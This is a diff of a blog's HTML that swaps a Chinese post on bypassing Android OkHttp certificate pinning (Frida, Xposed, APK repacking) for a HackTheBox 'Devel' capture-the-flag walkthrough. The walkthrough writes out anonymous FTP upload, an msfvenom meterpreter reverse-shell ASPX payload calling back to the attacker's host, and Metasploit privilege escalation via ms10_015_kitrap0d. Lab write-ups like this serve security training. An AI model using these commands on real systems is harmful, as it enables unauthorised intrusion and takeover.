@@ -11,7 +11,7 @@
   
   <title>
     
-      Bypassing OkHttp Certificate Pinning 
+      hackthebox-devel 
       
       
       |
@@ -123,42 +123,64 @@ MathJax = {
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">Bypassing OkHttp Certificate Pinning</div>
+      <div class="post-title">hackthebox-devel</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime" title="Update time"></i>
-          2021-02-19 23:25:18
+          2021-03-10 22:23:46
         </span>
         
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/hackthebox/" title="hackthebox">
+                    <b>#</b> hackthebox
+                  </a>
+                </span>
+                
+              </span>
+          
       </div>
       <div class="markdown-body">
-        <p>前阵子测试了一个安卓应用，发现使用了okhttp来做SSL证书绑定。我花了半天时间，尝试了各种方法来绕过SSL证书绑定，怕日后忘记，所以做个记录，日后好查阅。</p>
-<h3 id="1-Xposed-模块"><a href="#1-Xposed-模块" class="headerlink" title="#1: Xposed 模块"></a>#1: Xposed 模块</h3><ol>
-<li><a href="https://repo.xposed.info/module/mobi.acpm.sslunpinning" target="_blank" rel="noopener">SSLUnpinning</a></li>
-<li><a href="https://repo.xposed.info/module/com.virb3.trustmealready" target="_blank" rel="noopener">TrustMeAlready</a></li>
+        <h3 id="nmap-sS-sC-T4-10-10-10-5"><a href="#nmap-sS-sC-T4-10-10-10-5" class="headerlink" title="nmap -sS -sC -T4 10.10.10.5"></a>nmap -sS -sC -T4 10.10.10.5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">21&#x2F;tcp open  ftp</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| 03-12-21  04:09PM       &lt;DIR&gt;          AIECOZDXNV</span><br><span class="line">| 03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client</span><br><span class="line">| 03-12-21  06:58PM       &lt;DIR&gt;          DLQYOGLESL</span><br><span class="line">| 03-12-21  02:50PM       &lt;DIR&gt;          DMORAFIICY</span><br><span class="line">| 03-12-21  06:35PM       &lt;DIR&gt;          DRTPJUCGJC</span><br><span class="line">| 03-12-21  06:59PM       &lt;DIR&gt;          HCLWLFQOVZ</span><br><span class="line">| 03-12-21  04:18PM       &lt;DIR&gt;          IBBWANXNOP</span><br><span class="line">| 03-17-17  04:37PM                  689 iisstart.htm</span><br><span class="line">| 03-12-21  05:08PM                 2919 metrev_4444.aspx</span><br><span class="line">| 03-12-21  04:17PM       &lt;DIR&gt;          NCYWNOVRDC</span><br><span class="line">| 03-12-21  06:32PM       &lt;DIR&gt;          OFSKEOPYBG</span><br><span class="line">| 03-12-21  04:35PM       &lt;DIR&gt;          PGJWPCPOPM</span><br><span class="line">| 03-12-21  04:37PM       &lt;DIR&gt;          PRSUAPXTJD</span><br><span class="line">| 03-12-21  04:13PM       &lt;DIR&gt;          QIFHNXRHYF</span><br><span class="line">| 03-12-21  04:10PM       &lt;DIR&gt;          RFBJHMYNJV</span><br><span class="line">| 03-12-21  04:36PM       &lt;DIR&gt;          RHULYRBVEX</span><br><span class="line">| 03-12-21  07:00PM       &lt;DIR&gt;          SGRFXLJULC</span><br><span class="line">| 03-12-21  04:09PM       &lt;DIR&gt;          SIFCHRNDOJ</span><br><span class="line">| 03-12-21  04:35PM       &lt;DIR&gt;          TTOMWQTEXZ</span><br><span class="line">| 03-12-21  07:00PM       &lt;DIR&gt;          UKOLCHHPNH</span><br><span class="line">|_Only 20 shown. Use --script-args ftp-anon.maxlist&#x3D;-1 to see all.</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">80&#x2F;tcp open  http</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: IIS7</span><br></pre></td></tr></table></figure>
+
+<h3 id="FTP-anoymous"><a href="#FTP-anoymous" class="headerlink" title="FTP anoymous"></a>FTP anoymous</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; get iisstart.htm</span><br><span class="line">local: iisstart.htm remote: iisstart.htm</span><br><span class="line">200 PORT command successful.</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">689 bytes received in 0.08 secs (8.2933 kB&#x2F;s)</span><br><span class="line"></span><br><span class="line">ftp&gt; put lol.html</span><br><span class="line">local: lol.html remote: lol.html</span><br><span class="line">200 PORT command successful.</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">92 bytes sent in 0.00 secs (2.4372 MB&#x2F;s)</span><br></pre></td></tr></table></figure>
+<p>访问<a href="http://10.10.10.5/lol.html，确认资源存在。说明ftp就是web目录" target="_blank" rel="noopener">http://10.10.10.5/lol.html，确认资源存在。说明ftp就是web目录</a></p>
+<p><img src="https://s3.ax1x.com/2021/03/13/6av1Fs.png" alt="image"></p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | grep windows</span><br></pre></td></tr></table></figure>
+<p>搜索payloads找到 windows/meterpreter/reverse_tcp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>生成reverse aspx马，并上传到ftp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -f aspx LHOST&#x3D;10.10.14.21 LPORT&#x3D;1234 -o reverse_shell.aspx</span><br><span class="line">ftp&gt; put reverse_shell.aspx</span><br></pre></td></tr></table></figure>
+
+<p>打开msfconsole,配置客户端</p>
+<p><img src="https://s3.ax1x.com/2021/03/13/6av3Yn.png" alt="image"></p>
+<p>执行run开始监听本地1234端口，并访问<a href="http://10.10.10.5/reverse_shell.aspx建立连接" target="_blank" rel="noopener">http://10.10.10.5/reverse_shell.aspx建立连接</a></p>
+<p><img src="https://s3.ax1x.com/2021/03/13/6avJS0.png" alt="image"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>post/multi/recon/local_exploit_suggester</p>
+<p>用这个脚本可以枚举出windows系统漏洞，比如ms11-011，ms08067等</p>
+<p><img src="https://s3.ax1x.com/2021/03/13/6av8Wq.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[+] 10.10.10.5 - exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr: The target appears to be vulnerable.                                                                          │</span><br><span class="line">[+] 10.10.10.5 - exploit&#x2F;windows&#x2F;local&#x2F;ms10_015_kitrap0d: The service is running, but could not be validated.                                                            │</span><br><span class="line">[+] 10.10.10.5 - exploit&#x2F;windows&#x2F;local&#x2F;ms10_092_schelevator: The target appears to be vulnerable.                                                                        │</span><br><span class="line">[+] 10.10.10.5 - exploit&#x2F;windows&#x2F;local&#x2F;ms13_053_schlamperei: The target appears to be vulnerable.                                                                        │</span><br><span class="line">[+] 10.10.10.5 - exploit&#x2F;windows&#x2F;local&#x2F;ms13_081_track_popup_menu: The target appears to be vulnerable.                                                                   │</span><br><span class="line">[+] 10.10.10.5 - exploit&#x2F;windows&#x2F;local&#x2F;ms14_058_track_popup_menu: The target appears to be vulnerable.                                                                   │</span><br><span class="line">[+] 10.10.10.5 - exploit&#x2F;windows&#x2F;local&#x2F;ms15_004_tswbproxy: The service is running, but could not be validated.                                                           │</span><br><span class="line">[+] 10.10.10.5 - exploit&#x2F;windows&#x2F;local&#x2F;ms15_051_client_copy_image: The target appears to be vulnerable.                                                                  │</span><br><span class="line">[+] 10.10.10.5 - exploit&#x2F;windows&#x2F;local&#x2F;ms16_016_webdav: The service is running, but could not be validated.                                                              │</span><br><span class="line">[+] 10.10.10.5 - exploit&#x2F;windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.                                      │</span><br><span class="line">[+] 10.10.10.5 - exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection: The target appears to be vulnerable.                                                                         │</span><br><span class="line">[+] 10.10.10.5 - exploit&#x2F;windows&#x2F;local&#x2F;ntusermndragover: The target appears to be vulnerable.                                                                            │</span><br><span class="line">[+] 10.10.10.5 - exploit&#x2F;windows&#x2F;local&#x2F;ppr_flatten_rec: The target appears to be vulnerable.</span><br></pre></td></tr></table></figure>
+
+<p>exploit/windows/local/bypassuac_eventvwr</p>
+<p><img src="https://s3.ax1x.com/2021/03/13/6avQoj.png" alt="image"></p>
+<p>失败了</p>
+<p>exploit/windows/local/ms10_015_kitrap0d</p>
+<p><img src="https://s3.ax1x.com/2021/03/13/6avYlV.png" alt="image"></p>
+<p>成功了</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
+<li>nmap 发现ftp anonymous，可以put 文件，且ftp就是web目录，直接上传木马获得shell</li>
+<li>提权使用msf中的local_exploit_suggester来扫描windows系统漏洞，通过ms10_015_kitrap0d成功提权</li>
 </ol>
-<p>TrustMeAlready之前在测试其它安卓应用的时候就没成功，这次依然没成功。尝试了下SSLUnpinning，也没成功，不知道是不是操作手法不对-_-!</p>
-<h3 id="2-Frida"><a href="#2-Frida" class="headerlink" title="#2: Frida"></a>#2: Frida</h3><p>Frida的安装很简单</p>
-<ol>
-<li>pip install frida-tools</li>
-<li>下载frida-server，拷贝到安卓模拟器/data/local/tmp，并且chmod +x设置执行权限。</li>
-<li>将burpsuite证书cert-der.crt 拷贝到安卓模拟器/data/local/tmp</li>
-<li>将脚本<a href="https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/" target="_blank" rel="noopener">Universal Android SSL Pinning Bypass</a>注入到应用进程中</li>
-</ol>
-<p><img src="https://captmeelo.com/static/img/16/frida-multiple-pinning.png" alt><br>尝试了<a href="https://codeshare.frida.re/browse" target="_blank" rel="noopener">codeshare</a>上好几个ssl pinning脚本都失败了。。</p>
-<h3 id="3-手动修改apk，重打包"><a href="#3-手动修改apk，重打包" class="headerlink" title="#3: 手动修改apk，重打包"></a>#3: 手动修改apk，重打包</h3><p>分析应用日志：adb logcat ｜ grep app包</p>
-<p>分析发现，有一串奇怪的sha1/xxxx。查了下资料，应该是证书指纹这么个东西。参考：<a href="https://blog.51cto.com/dashdotdash/1963485" target="_blank" rel="noopener">获取SSL证书指纹</a><br><img src="https://captmeelo.com/static/img/16/log.png" alt></p>
-<p>如果证书链中的证书指纹匹配到pinned中的证书指纹，则通过认证。</p>
-<p>解压apk包，找到pinned 证书指纹的位置:/res/values/arrays.xml<br><img src="https://captmeelo.com/static/img/16/location.png" alt></p>
-<p>将burp的证书指纹写入到arrays.xml<br><img src="https://captmeelo.com/static/img/16/modification.png" alt><br>然后重新打包apk<br><img src="https://captmeelo.com/static/img/16/rebuild.png" alt><br><img src="https://captmeelo.com/static/img/16/install.png" alt></p>
-<p>最后，终于如愿以偿抓到了https数据包<br><img src="https://captmeelo.com/static/img/16/burp.png" alt></p>
 
       </div>
       
         <div class="prev-or-next">
           <div class="post-foot-next">
             
-              <a href="/2020/09/06/HackThebox-Lame/" target="_self">
+              <a href="/2021/02/19/Bypassing-OkHttp-Certificate-Pinning/" target="_self">
                 <i class="iconfont icon-chevronleft"></i>
                 <span>Prev</span>
               </a>
@@ -167,16 +189,22 @@ MathJax = {
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime" title="Update time"></i>
-              2021-02-19 23:25:18
+              2021-03-10 22:23:46
             </span>
             
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/hackthebox/" title="hackthebox">
+                        <b>#</b> hackthebox
+                      </a>
+                    </span>
+                    
+                  </span>
+              
           </div>
           <div class="post-foot-prev">
-            
-              <a href="/2021/03/10/hackthebox-devel/" target="_self">
-                <span>Next</span>
-                <i class="iconfont icon-chevronright"></i>
-              </a>
             
           </div>
         </div>
@@ -186,7 +214,7 @@ MathJax = {
   <div class="post-catalog" id="catalog">
     <div class="title">Contents</div>
     <div class="catalog-content">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Xposed-模块"><span class="toc-text">#1: Xposed 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Frida"><span class="toc-text">#2: Frida</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-手动修改apk，重打包"><span class="toc-text">#3: 手动修改apk，重打包</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap-sS-sC-T4-10-10-10-5"><span class="toc-text">nmap -sS -sC -T4 10.10.10.5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-anoymous"><span class="toc-text">FTP anoymous</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权"><span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
     </div>
   </div>
 
